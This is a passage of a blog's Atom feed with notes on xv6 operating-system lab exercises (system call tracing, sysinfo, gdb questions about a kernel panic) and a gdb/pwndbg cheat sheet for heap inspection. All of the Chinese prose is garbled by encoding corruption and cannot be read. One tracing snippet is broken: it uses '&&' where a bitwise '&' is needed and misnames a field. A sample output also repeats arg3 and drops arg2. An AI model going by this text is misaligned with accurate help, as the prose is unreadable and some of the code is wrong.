å°„ï¼Œ"></a>å–æ¶ˆç”¨æˆ·è¿›ç¨‹çš„ç¬¬ä¸€é¡µçš„æ˜ å°„ï¼Œ</h3><p>è¿™æ ·å¯ä»¥ä½¿å¼•ç”¨ç©ºæŒ‡é’ˆç›´æ¥é€ æˆé”™è¯¯</p><p>éœ€è¦ä¿®æ”¹ user.ld æ–‡ä»¶ï¼Œè®©è¿›ç¨‹çš„ text æ®µä» 0x1000 å¼€å§‹ï¼Œè€Œä¸æ˜¯ 0</p><p>ä¼°è®¡è¦æ”¹å¾ˆå¤šä¸œè¥¿ï¼ˆuvmmapï¼Œuvmallocå•¥çš„ï¼‰ã€‚ã€‚ã€‚å’•å’•å’•</p><h3 id="æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š-dirty-pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰"><a href="#æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š-dirty-pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰" class="headerlink" title="æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š dirty pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰"></a>æ·»åŠ ä¸€ä¸ªç³»ç»Ÿè°ƒç”¨æŠ¥å‘Š dirty pagesï¼ˆä¿®æ”¹è¿‡çš„é¡µè¡¨ï¼‰</h3><p>å’Œç¬¬ä¸‰ä¸ªå·®ä¸å¤šï¼Œå°±ä¸åšäº†</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å­¦ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Lab2 System Calls</title>
    <link href="https://humoooor.cn/2022/10/20/Lab2_System_calls/"/>
    <id>https://humoooor.cn/2022/10/20/Lab2_System_calls/</id>
    <published>2022-10-20T01:36:00.000Z</published>
    <updated>2023-05-23T03:22:36.261Z</updated>
    
    <content type="html"><![CDATA[<p>å¼€å­¦ï¼</p><span id="more"></span><h2 id="å®éªŒå¼€å§‹å‰"><a href="#å®éªŒå¼€å§‹å‰" class="headerlink" title="å®éªŒå¼€å§‹å‰"></a>å®éªŒå¼€å§‹å‰</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git fetch</span><br><span class="line">git checkout syscall</span><br><span class="line">make clean</span><br></pre></td></tr></table></figure><h2 id="ä½¿ç”¨-gdb"><a href="#ä½¿ç”¨-gdb" class="headerlink" title="ä½¿ç”¨ gdb"></a>ä½¿ç”¨ gdb</h2><ol><li>æŸ¥çœ‹ backtrace çš„è¾“å‡ºï¼Œå“ªä¸ªå‡½æ•°è°ƒç”¨äº† syscall<ul><li><code>usertrap()</code></li><li>åœ¨ syscall è®¾ç½®æ–­ç‚¹åï¼Œè¾“å…¥ <code>backtrace</code> æŸ¥çœ‹æ ˆå›æº¯</li></ul></li><li>p-&gt;trapframe-&gt;a7 çš„å€¼æ˜¯å¤šå°‘ï¼Œå€¼ä»£è¡¨ä»€ä¹ˆï¼Ÿ<ul><li>7ï¼Œä»£è¡¨ç³»ç»Ÿè°ƒç”¨å· SYS_exec</li><li><code>p/x *p-&gt;trapframe</code> è¾“å‡º p çš„ trapframe å†…å®¹</li></ul></li><li>CPU çš„ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ä»€ä¹ˆï¼Ÿ<ul><li>ç”¨æˆ·æ¨¡å¼</li><li><code>p/x $sstatus</code> è¾“å‡º sstatus å¯„å­˜å™¨çš„å€¼ï¼Œ0x22</li><li>åœ¨ <code>kernel/riscv.h</code> ä¸­æœ‰å®šä¹‰ï¼š<code>#define SSTATUS_SPP (1L &lt;&lt; 8)  // Previous mode, 1=Supervisor, 0=User</code>ï¼Œä¹Ÿå¯ä»¥çœ‹ç»™çš„æ–‡æ¡£</li><li>è¿™é‡Œçš„ SPP ä½ä¸º 0ï¼Œå› æ­¤ä¸Šä¸€ä¸ªæ¨¡å¼æ˜¯ç”¨æˆ·æ¨¡å¼</li></ul></li><li>ä»¤ <code>num = * (int *) 0;</code>ï¼Œkernel åœ¨å“ªæ¡æ±‡ç¼–æŒ‡ä»¤ panicï¼Œå“ªä¸ªå¯„å­˜å™¨å¯¹åº”å˜é‡ num<ul><li><code>lw a3, 0(zero)</code>ï¼Œa3</li><li>æŸ¥çœ‹ panic æ—¶ spec å¯„å­˜å™¨çš„å€¼æŒ‡å‘å“ªä¸ªæ±‡ç¼–</li></ul></li><li>ä¸ºä»€ä¹ˆå†…æ ¸å´©æºƒäº†ï¼Ÿåœ¨å†…æ ¸åœ°å€ç©ºé—´ 0 åœ°å€æœ‰æ˜ å°„å—ï¼Ÿä¸Šé¢çš„ scause å€¼æ˜¯å¦è¯å®è¿™ä¸€ç‚¹ï¼Ÿ<ul><li>å› ä¸ºå°è¯•è¯»å– 0 åœ°å€ï¼Œå®ƒæ²¡æœ‰æœ‰æ•ˆæ˜ å°„</li><li>å¯„å­˜å™¨ scause è¡¨ç¤ºå‘ç”Ÿ trap çš„åŸå› ï¼Œè¿™é‡Œçš„ scause æ˜¯ 0xdï¼ŒæŸ¥çœ‹æ–‡æ¡£å¯ä»¥çŸ¥é“ï¼Œ0xd è¡¨ç¤º Load page faultï¼Œåˆç†</li></ul></li><li>å½“å†…æ ¸ panic æ—¶è¿›ç¨‹çš„åå­—æ˜¯ä»€ä¹ˆï¼Ÿè¿›ç¨‹ pid æ˜¯å¤šå°‘ï¼Ÿ<ul><li>â€œinitcodeâ€ï¼Œ1</li></ul></li></ol><p>ä¸€å¼€å§‹åšå› ä¸ºå¯„å­˜å™¨çš„å€¼ä¸äº†è§£ï¼Œè¿˜ä¸å¤ªèƒ½çœ‹æ‡‚æ–‡æ¡£ï¼Œæ²¡èƒ½ç†è§£ï¼Œè·³è¿‡äº†ï¼Œæœ‰äº›ç­”æ¡ˆæ˜¯åé¢æ›´æ–°çš„</p><p>ç–‘é—®</p><ul><li>è®¿é—®åˆ° 0 åœ°å€æ—¶ä¸ºä»€ä¹ˆä¼šè·³è½¬åˆ° kernelvec ä¸­</li><li>scauseã€sepcã€stval çš„å«ä¹‰</li></ul><p>æ›´æ–°ï¼šè®¿é—® 0 å‘ç”Ÿäº† trapï¼Œéœ€è¦è·³è½¬åˆ°å¤„ç†å†…æ ¸ trap çš„ä½ç½®ï¼Œå³ <code>kerneltrap</code>ï¼Œè€Œåœ¨å¤„ç†ä¹‹å‰ï¼Œå…ˆä¿å­˜å†…æ ¸çš„çŠ¶æ€ï¼Œ<code>kernelvec</code> å°±æ˜¯åšè¿™æ ·çš„äº‹æƒ…ï¼›scause æè¿° trap åŸå› ï¼Œsepc ä¿å­˜å‘ç”Ÿ trap æ—¶ pc çš„å€¼ï¼Œstval ä¿å­˜å‘ç”Ÿ trap çš„å€¼</p><h2 id="System-call-tracing"><a href="#System-call-tracing" class="headerlink" title="System call tracing"></a>System call tracing</h2><p>åœ¨ <code>user/trace.c</code> å·²ç»å†™å¥½äº†ç¨‹åºï¼Œåªéœ€è¦å®ç°ç³»ç»Ÿè°ƒç”¨å³å¯</p><ol><li>å…ˆåœ¨ <code>user/user.h</code> åŠ ä¸ŠåŸå‹ï¼Œåœ¨ <code>user/usys.pl</code> åŠ ä¸Š stubï¼ˆå­˜æ ¹ï¼‰ï¼Œåœ¨ <code>kernel/syscall.h</code> åŠ ä¸Šç³»ç»Ÿè°ƒç”¨å·</li><li>åœ¨ <code>kernel.c</code> çš„ proc ç»“æ„ä½“åŠ ä¸Šä¸€ä¸ªæ–°å˜é‡ trace_mask</li><li>åœ¨ <code>kernel/sysproc.c</code> åŠ ä¸Š <code>sys_trace</code>ï¼Œè®¾ç½®å½“å‰è¿›ç¨‹çš„ track_mask</li></ol><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_trace</span><span class="params">(<span class="type">int</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> mask;</span><br><span class="line"></span><br><span class="line">  argint(<span class="number">0</span>, &amp;mask);</span><br><span class="line">  <span class="keyword">if</span>(mask &lt; <span class="number">0</span>)</span><br><span class="line">    mask = <span class="number">0</span>;</span><br><span class="line">  myproc()-&gt;trace_mask = mask;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>ä¿®æ”¹ <code>kernel/proc.c</code> çš„ <code>fork</code> å‡½æ•°ï¼Œå°†çˆ¶è¿›ç¨‹çš„ tracemask ä¼ ç»™å­è¿›ç¨‹</li></ol><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">np-&gt;trace_mask = p-&gt;trace_mask;</span><br></pre></td></tr></table></figure><ol start="5"><li>ä¿®æ”¹ <code>kernel/syscall.c</code> çš„ <code>syscall</code> å‡½æ•°ï¼Œå¦‚æœæ˜¯ trace_mask å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œå°±æ‰“å°å‡ºæ¥ï¼ˆé‡Œé¢è¿˜è¦æ·»åŠ ä¸€ä¸ªå­—ç¬¦ä¸²æ•°ç»„ syscallNamesï¼‰</li></ol><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ret = syscalls[num]();</span><br><span class="line">p-&gt;trapframe-&gt;a0 = ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(p-&gt;tracemask &amp;&amp; <span class="number">1</span>&lt;&lt;num)</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªå¾ˆç®€å•çš„ç³»ç»Ÿè°ƒç”¨ï¼Œä»…ä»…æ˜¯è·å–ç³»ç»Ÿè°ƒç”¨å‚æ•°ï¼Œç„¶åå°†å‚æ•°ä¼ ç»™ p-&gt;trace_maskï¼Œåœ¨ <code>syscall</code> å‡½æ•°ä¸­æ£€æŸ¥è¾“å‡ºè°ƒç”¨çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå°±å¯ä»¥å®ç°ï¼Œä½†æ˜¯èƒ½å­¦åˆ°å¾ˆå¤šç»†èŠ‚</p><h2 id="Sysinfo"><a href="#Sysinfo" class="headerlink" title="Sysinfo"></a>Sysinfo</h2><p>è¿™é‡Œæˆ‘ä»¬è¦ä½¿ç”¨ copyoutï¼Œå› ä¸ºç³»ç»Ÿè°ƒç”¨å‡½æ•°ä½å¤„äºå†…æ ¸æ¨¡å¼ï¼Œéœ€è¦è¿›ç¨‹çš„é¡µè¡¨å’Œè™šæ‹Ÿåœ°å€æ¥æŸ¥æ‰¾ç”¨æˆ·è¿›ç¨‹ä¸­å˜é‡çš„ç‰©ç†ä½ç½®ï¼ˆæ¯”å¦‚ sysinfo ç»“æ„ä½“ï¼‰ï¼Œç„¶åå°†å†…æ ¸çš„æ•°æ®å¤åˆ¶ç»™ç”¨æˆ·è¿›ç¨‹</p><figure class="highlight c"><figcaption><span>kernel/sysproc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">sys_sysinfo</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    uint64 si;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sysinfo</span> <span class="title">info</span>;</span></span><br><span class="line"></span><br><span class="line">    argaddr(<span class="number">0</span>, &amp;si);</span><br><span class="line">    <span class="keyword">if</span>(!si) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    info.freemem = get_freemem();</span><br><span class="line">    info.nproc = get_nproc();</span><br><span class="line">    <span class="keyword">if</span>(copyout(myproc()-&gt;pagetable, si, (<span class="type">char</span>*)&amp;info, <span class="keyword">sizeof</span>(info)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ get_freemem æ—¶ï¼Œè§‚å¯Ÿ kalloc å‡½æ•°ï¼Œç›´æ¥ä» kmem.freelist å–ä¸€é¡µå†…å­˜è¿”å›ï¼Œå¯ä»¥æ¨æµ‹ kmem.freelist åŒ…å«æ‰€æœ‰å¯ç”¨çš„å†…å­˜</p><figure class="highlight c"><figcaption><span>kernel/kalloc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_freemem</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">run</span> *<span class="title">r</span>;</span></span><br><span class="line">  uint64 n = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span>(r = kmem.freelist; r; r = r-&gt;next) &#123;</span><br><span class="line">    n += <span class="number">4096</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> n;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å†™ ger_nproc æ—¶ï¼Œè§‚å¯Ÿ procinit å‡½æ•°ï¼Œåœ¨ proc[NPROC] æ•°æ®ä¸­éå†åˆå§‹åŒ–ï¼Œä¸”å…¶ä¸­å« state å˜é‡</p><figure class="highlight c"><figcaption><span>kernel/proc.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">uint64</span><br><span class="line"><span class="title function_">get_nproc</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">proc</span> *<span class="title">p</span>;</span></span><br><span class="line">  uint64 nproc = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span>(p = proc; p &lt; &amp;proc[NPROC]; p++) &#123;</span><br><span class="line">    <span class="keyword">if</span>(p-&gt;state != UNUSED) &#123;</span><br><span class="line">      nproc++;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> nproc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è®°å¾—åœ¨ sysproc.c å¼•å…¥ sysinfo.hï¼Œåœ¨ defs.h åŠ ä¸Š get_freemem å’Œ get_nproc</p><h2 id="Optional-challenge-exercises"><a href="#Optional-challenge-exercises" class="headerlink" title="Optional challenge exercises"></a>Optional challenge exercises</h2><h3 id="æ‰“å°å‡ºè¢«è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"><a href="#æ‰“å°å‡ºè¢«è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°" class="headerlink" title="æ‰“å°å‡ºè¢«è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°"></a>æ‰“å°å‡ºè¢«è¿½è¸ªçš„ç³»ç»Ÿè°ƒç”¨çš„å‚æ•°</h3><p>æ¯ä¸ªç³»ç»Ÿè°ƒç”¨å‚æ•°ä¸ªæ•°è®°å½•åœ¨æ•°ç»„é‡Œï¼Œç„¶åæ‰“å°å‡ºæ¥å°±å¥½äº†</p><figure class="highlight c"><figcaption><span>kernel/syscall.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(p-&gt;trace_mask &amp; <span class="number">1</span>&lt;&lt;num) &#123;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%d: syscall %s -&gt; %d\n&quot;</span>, p-&gt;pid, syscall_names[num], ret);</span><br><span class="line">  <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; syscall_args[num]; i++)</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;arg%d: %p\n&quot;</span>, i+<span class="number">1</span>, argraw(i));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ‰“å°å‡ºæ¥æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">$ trace 32 grep hello README</span><br><span class="line">3: syscall read -&gt; 1023</span><br><span class="line">arg1: 0x00000000000003ff</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br><span class="line">3: syscall read -&gt; 961</span><br><span class="line">arg1: 0x00000000000003c1</span><br><span class="line">arg2: 0x000000000000104e</span><br><span class="line">arg3: 0x00000000000003c1</span><br><span class="line">3: syscall read -&gt; 321</span><br><span class="line">arg1: 0x0000000000000141</span><br><span class="line">arg3: 0x0000000000001037</span><br><span class="line">arg3: 0x00000000000003d8</span><br><span class="line">3: syscall read -&gt; 0</span><br><span class="line">arg1: 0x0000000000000000</span><br><span class="line">arg2: 0x0000000000001010</span><br><span class="line">arg3: 0x00000000000003ff</span><br></pre></td></tr></table></figure><h3 id="è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡-sysinfo-å¯¼å‡º"><a href="#è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡-sysinfo-å¯¼å‡º" class="headerlink" title="è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡ sysinfo å¯¼å‡º"></a>è®¡ç®—è´Ÿè½½å¹³å‡å€¼å¹¶é€šè¿‡ sysinfo å¯¼å‡º</h3><p>å¯ä»¥å€Ÿç”¨ Linux çš„ç®—æ³•è®¡ç®—ï¼ˆæ‡’ï¼‰</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;å¼€å­¦ï¼&lt;/p&gt;</summary>
    
    
    
    <category term="Course" scheme="https://humoooor.cn/categories/Course/"/>
    
    <category term="MIT 6.1810 2022Fall" scheme="https://humoooor.cn/categories/Course/MIT-6-1810-2022Fall/"/>
    
    
    <category term="Operating System" scheme="https://humoooor.cn/tags/Operating-System/"/>
    
    <category term="RISC-V" scheme="https://humoooor.cn/tags/RISC-V/"/>
    
    <category term="Xv6" scheme="https://humoooor.cn/tags/Xv6/"/>
    
  </entry>
  
  <entry>
    <title>Gdb å¸¸ç”¨å‘½ä»¤</title>
    <link href="https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
    <id>https://humoooor.cn/2022/10/17/Gdb%20%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</id>
    <published>2022-10-17T12:10:00.000Z</published>
    <updated>2023-06-01T08:47:53.873Z</updated>
    
    <content type="html"><![CDATA[<p>pwndbg + pwngdb + angelheap</p><span id="more"></span><h2 id="Gdb-åŸç”Ÿå‘½ä»¤"><a href="#Gdb-åŸç”Ÿå‘½ä»¤" class="headerlink" title="Gdb åŸç”Ÿå‘½ä»¤"></a>Gdb åŸç”Ÿå‘½ä»¤</h2><ul><li>c = continue<ul><li>ctrl-c å–æ¶ˆ</li></ul></li><li>ni = step æ±‡ç¼–çº§ n = step Cè¯­è¨€çº§</li><li>si = stepi</li><li>b = break<ul><li>æ·»åŠ åœ°å€æ–­ç‚¹ï¼Œå½“è¿è¡Œåˆ°ç«¯ç‚¹ä¼šåœä¸‹æ¥</li><li>ç”¨ deleteï¼Œdisableï¼Œenable ä¿®æ”¹æ–­ç‚¹</li></ul></li><li>watch<ul><li>æ·»åŠ å˜é‡æ–­ç‚¹</li><li>watch &lt;expression&gt; å½“å˜é‡æ”¹å˜æ—¶ä¼šåœä¸‹æ¥</li><li>watch -l &lt;address&gt; å½“åœ°å€æŒ‡å‘çš„å˜é‡æ”¹å˜æ—¶ä¼šåœä¸‹æ¥</li><li>rwatch -l &lt;address&gt; å½“åœ°å€æŒ‡å‘çš„å˜é‡è¢«è¯»å–æ—¶ä¼šåœä¸‹æ¥</li><li>watch var if xxx æ·»åŠ æ¡ä»¶</li></ul></li><li>x/&lt;n/f/u&gt; &lt;addr&gt;<ul><li>æ‰“å°å†…å­˜åœ°å€ä¸­çš„å€¼</li><li>n è¡¨ç¤ºå†…å­˜å•å…ƒä¸ªæ•°</li><li>f è¡¨ç¤ºè¾“å‡ºæ ¼å¼<ul><li>i æ±‡ç¼–</li><li>t äºŒè¿›åˆ¶æ ¼å¼</li><li>o å…«è¿›åˆ¶æ ¼å¼</li><li>d åè¿›åˆ¶æœ‰ç¬¦å·æ•´å‹</li><li>u åè¿›åˆ¶æ— ç¬¦å·æ•´å‹</li><li>x åå…­è¿›åˆ¶ï¼Œè¡¥é½å‰ç¼€ 0</li><li>a åå…­è¿›åˆ¶ï¼Œä¸è¡¥é½</li><li>f æµ®ç‚¹æ•°</li><li>c å­—ç¬¦</li><li>s å­—ç¬¦ä¸²</li></ul></li><li>u è¡¨ç¤ºå†…å­˜å•å…ƒå¤§å°<ul><li>é»˜è®¤ä¸ºæœºå™¨å­—å¤§å°</li><li>b è¡¨ç¤ºå•å­—èŠ‚</li><li>h è¡¨ç¤ºåŒå­—èŠ‚</li><li>w è¡¨ç¤ºå››å­—èŠ‚</li><li>g è¡¨ç¤ºå…«å­—èŠ‚</li></ul></li></ul></li><li>p/&lt;n/f/u&gt; = print<ul><li>æ‰“å°</li><li>p *(struct elfhdr*) 0x10000</li><li>p *argv@argc<ul><li>æ‰“å°å‚æ•°</li></ul></li></ul></li><li>info<ul><li>info registers<ul><li>æŸ¥çœ‹å¯„å­˜å™¨</li></ul></li><li>info frame<ul><li>æŸ¥çœ‹å½“å‰æ ˆå¸§ä¿¡æ¯</li></ul></li><li>info breakpoints<ul><li>æŸ¥çœ‹æ–­ç‚¹</li></ul></li><li>info locals<ul><li>æŸ¥çœ‹æœ¬åœ°å˜é‡</li></ul></li><li>info args<ul><li>æŸ¥çœ‹å‡½æ•°å‚æ•°</li></ul></li></ul></li><li>frame &lt;n&gt;<ul><li>è·³è½¬åˆ°ä¸Šå±‚æ ˆå¸§ï¼Œé…åˆ i frame ä½¿ç”¨</li></ul></li><li>list &lt;location&gt;<ul><li>æ‰“å°åœ°å€å¯¹åº”çš„å‡½æ•°çš„æºä»£ç </li></ul></li><li>bt = backtrace<ul><li>æŸ¥çœ‹æ‰€æœ‰æ ˆå¸§ä¿¡æ¯</li></ul></li><li>layout split<ul><li>è¿›å…¥åˆ†ç¦»æ¨¡å¼ï¼Œå¯ä»¥æŸ¥çœ‹å½“å‰è¿è¡Œçš„æºç å’Œåæ±‡ç¼–</li></ul></li><li>up &amp; down<ul><li>è¿›å…¥ä¸Š &amp; ä¸‹ä¸€çº§å‡½æ•°</li></ul></li><li>set<ul><li>ä¿®æ”¹å˜é‡æˆ–å¯„å­˜å™¨çš„å€¼</li><li>set var $pc=0x3ffffff000</li></ul></li></ul><h3 id="å›æº¯è°ƒè¯•"><a href="#å›æº¯è°ƒè¯•" class="headerlink" title="å›æº¯è°ƒè¯•"></a>å›æº¯è°ƒè¯•</h3><ul><li>record<ul><li>å¼€å§‹è®°å½•è¿›ç¨‹çŠ¶æ€</li></ul></li><li>reverse-*<ul><li>åŠ ä¸Šä¸€äº›å¸¸ç”¨çš„å‘½ä»¤ï¼Œå¯å®ç°åå‘è¿è¡Œ</li><li>å¦‚ reverse-nextiï¼Œreverse-finish</li></ul></li></ul><h2 id="Pwndbg"><a href="#Pwndbg" class="headerlink" title="Pwndbg"></a>Pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">parseheap</span><br><span class="line"><span class="comment"># æŸ¥çœ‹å †ä¸­ä½¿ç”¨æƒ…å†µ</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; parseheap</span><br><span class="line">addr             prev             size              status           fd             bk</span><br><span class="line">0x603000         0x0              0x290             Used             None           None</span><br><span class="line">0x603290         0x0              0x20              Used             None           None</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">bins</span><br><span class="line"><span class="comment"># æŸ¥çœ‹ bin ä¸­æƒ…å†µ</span></span><br><span class="line"></span><br><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">0x20 [  1]: 0x6032c0 â—‚â€” 0x0</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line"></span><br><span class="line">vis</span><br><span class="line"></span><br><span class="line">pwndbg&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Angelheap"><a href="#Angelheap" class="headerlink" title="Angelheap"></a>Angelheap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">chunkinfo + chunkheader address</span><br><span class="line"></span><br><span class="line">pwndbg&gt; chunkinfo 0x603000</span><br><span class="line">==================================</span><br><span class="line">            Chunk info            </span><br><span class="line">==================================</span><br><span class="line">Status :  Used</span><br><span class="line">Freeable : True</span><br><span class="line">prev_size : 0x0</span><br><span class="line">size : 0x290</span><br><span 